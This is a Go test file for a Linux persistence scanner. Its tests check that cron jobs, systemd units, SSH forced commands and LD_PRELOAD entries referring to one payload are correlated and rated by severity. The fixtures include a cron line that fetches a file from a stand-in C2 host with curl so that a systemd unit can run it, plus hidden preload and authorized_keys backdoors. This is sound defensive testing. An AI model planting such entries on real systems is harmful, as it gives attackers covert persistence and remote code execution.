package persistence

import (
	"testing"

	"github.com/Lutfifakee-Project/ronda/internal/finding"
)

// payloadFixture plants one payload executable referenced by several
// persistence mechanisms in the tests below.
func payloadFixture(f *fixtureRoot, path string) {
	f.writeExecutable(path, "#!/bin/sh\n# synthetic payload fixture; never executed\n")
}

func TestCorrelationCronAndSystemdSamePayload(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	payloadFixture(f, "/opt/.srv/agent")
	f.write("/etc/cron.d/sync", "*/5 * * * * root /opt/.srv/agent --sync\n")
	f.write("/etc/systemd/system/sync.service", "[Service]\nExecStart=/opt/.srv/agent --serve\n")
	rep := f.scan()
	countRule(t, rep, "correlation-shared-payload", 1)
	fl := findingsByRule(rep)["correlation-shared-payload"][0]
	if fl.Severity != finding.High {
		t.Errorf("two independent mechanisms on one payload must be HIGH, got %s", fl.Severity)
	}
	if fl.Target != "/opt/.srv/agent" {
		t.Errorf("target = %q", fl.Target)
	}
	if len(fl.Signals) < 2 {
		t.Errorf("correlation must carry the referring artifacts as signals, got %d", len(fl.Signals))
	}
	mechs := map[string]bool{}
	for _, s := range fl.Signals {
		mechs[s.Rule] = true
	}
	if !mechs["systemd"] || !mechs["cron"] {
		t.Errorf("signals must record both mechanisms, got %v", mechs)
	}
}

func TestCorrelationShellProfileAndLdsoPreload(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/opt/lib/.hook.so", elfBytes(62))
	// The shell profile and the loader preload list reference the same
	// library through two independent artifact families.
	f.write("/home/ubuntu/.profile", "export LD_PRELOAD=/opt/lib/.hook.so\n")
	f.write("/etc/ld.so.preload", "/opt/lib/.hook.so\n")
	rep := f.scan()
	countRule(t, rep, "correlation-shared-payload", 1)
	fl := findingsByRule(rep)["correlation-shared-payload"][0]
	mechs := map[string]bool{}
	for _, s := range fl.Signals {
		mechs[s.Rule] = true
	}
	if !mechs["shell"] || !mechs["ldso"] {
		t.Errorf("shell and ldso mechanisms must both appear, got %v", mechs)
	}
}

func TestCorrelationSSHForcedCommandAndSystemd(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	payloadFixture(f, "/opt/.srv/agent")
	f.write("/home/ubuntu/.ssh/authorized_keys",
		"command=\"/opt/.srv/agent --serve\" ssh-ed25519 "+fakeEd25519Blob+" ops@hub\n")
	f.write("/etc/systemd/system/agent.service", "[Service]\nExecStart=/opt/.srv/agent\n")
	rep := f.scan()
	countRule(t, rep, "correlation-shared-payload", 1)
	fl := findingsByRule(rep)["correlation-shared-payload"][0]
	mechs := map[string]bool{}
	for _, s := range fl.Signals {
		mechs[s.Rule] = true
	}
	if !mechs["ssh"] || !mechs["systemd"] {
		t.Errorf("ssh and systemd mechanisms must both appear, got %v", mechs)
	}
}

func TestCorrelationWriteThenExecRelationship(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	// cron writes the payload (download -o), a systemd unit executes it.
	f.write("/etc/cron.d/fetch", "*/10 * * * * root curl -s http://c2.example/p -o /var/tmp/.agent\n")
	f.write("/etc/systemd/system/agent.service", "[Service]\nExecStart=/var/tmp/.agent --quiet\n")
	rep := f.scan()
	countRule(t, rep, "cron-exec-writable-path", 1)
	countRule(t, rep, "systemd-exec-writable-path", 1)
	countRule(t, rep, "correlation-shared-payload", 1)
	fl := findingsByRule(rep)["correlation-shared-payload"][0]
	if fl.Target != "/var/tmp/.agent" {
		t.Errorf("target = %q, want the written payload path", fl.Target)
	}
}

func TestCorrelationNestedShellInvocation(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	payloadFixture(f, "/opt/.srv/agent")
	// The unit's direct target is the shell wrapper; the payload lives in
	// the `sh -c` string. Correlation still records the payload reference.
	f.write("/etc/systemd/system/wrapped.service", "[Service]\nExecStart=/bin/sh -c \"/opt/.srv/agent --run\"\n")
	f.write("/etc/cron.d/wrapped", "0 * * * * root /opt/.srv/agent\n")
	rep := f.scan()
	countRule(t, rep, "systemd-missing-target", 0)
	countRule(t, rep, "correlation-shared-payload", 1)
	if fl := findingsByRule(rep)["correlation-shared-payload"][0]; fl.Target != "/opt/.srv/agent" {
		t.Errorf("target = %q, want the inner payload", fl.Target)
	}
}

func TestCorrelationSingleMechanismNotReported(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	payloadFixture(f, "/opt/.srv/agent")
	// Two artifacts of the SAME mechanism: correlation demands independent
	// mechanisms, so no cross-artifact finding is fabricated.
	f.write("/etc/cron.d/a", "*/5 * * * * root /opt/.srv/agent --a\n")
	f.write("/etc/cron.d/b", "*/5 * * * * root /opt/.srv/agent --b\n")
	rep := f.scan()
	countRule(t, rep, "correlation-shared-payload", 0)
}

func TestCorrelationPackageOwnedQuiet(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/usr/sbin/legit-agent", elfBytes(62))
	f.write("/var/lib/dpkg/info/legit-agent.list", "/usr/sbin/legit-agent\n")
	f.write("/etc/cron.d/legit", "0 * * * * root /usr/sbin/legit-agent --run\n")
	f.write("/etc/systemd/system/legit.service", "[Service]\nExecStart=/usr/sbin/legit-agent\n")
	rep := f.scan()
	countRule(t, rep, "correlation-shared-payload", 0)
}

func TestCorrelationDuplicateFindingPrevention(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	payloadFixture(f, "/opt/.srv/agent")
	// The same mechanism pair seen three times must still yield exactly
	// one correlation finding for the target.
	f.write("/etc/cron.d/a", "*/5 * * * * root /opt/.srv/agent --a\n")
	f.write("/etc/systemd/system/a.service", "[Service]\nExecStart=/opt/.srv/agent --a\n")
	f.write("/etc/systemd/system/a2.service", "[Service]\nExecStart=/opt/.srv/agent --a2\n")
	rep := f.scan()
	countRule(t, rep, "correlation-shared-payload", 1)
}

func TestCorrelationBySharedHash(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	// Two distinct paths, one payload image: copied binaries correlate by
	// SHA-256 across mechanisms.
	f.write("/var/tmp/.agent", elfBytes(62))
	f.write("/opt/.srv/agent2", elfBytes(62))
	f.write("/etc/cron.d/copy", "*/5 * * * * root /var/tmp/.agent --run\n")
	f.write("/etc/systemd/system/copy.service", "[Service]\nExecStart=/opt/.srv/agent2\n")
	rep := f.scan()
	countRule(t, rep, "correlation-shared-hash", 1)
	fl := findingsByRule(rep)["correlation-shared-hash"][0]
	if fl.Kind != "correlation" {
		t.Errorf("kind = %q", fl.Kind)
	}
}

func TestCorrelationPlainToolReferencedTwiceIsMedium(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	// An ordinary locally deployed maintenance tool run by two independent
	// schedulers is a real relationship but not a strong compromise
	// indicator: the correlation stays visible at MEDIUM, not HIGH.
	payloadFixture(f, "/usr/local/bin/deploy-agent")
	f.write("/etc/cron.d/deploy", "0 4 * * * root /usr/local/bin/deploy-agent --sync\n")
	f.write("/etc/systemd/system/deploy.service", "[Service]\nExecStart=/usr/local/bin/deploy-agent --serve\n")
	rep := f.scan()
	countRule(t, rep, "correlation-shared-payload", 1)
	fl := findingsByRule(rep)["correlation-shared-payload"][0]
	if fl.Severity != finding.Medium {
		t.Errorf("ordinary tool referenced by two schedulers must stay MEDIUM, got %s", fl.Severity)
	}
}
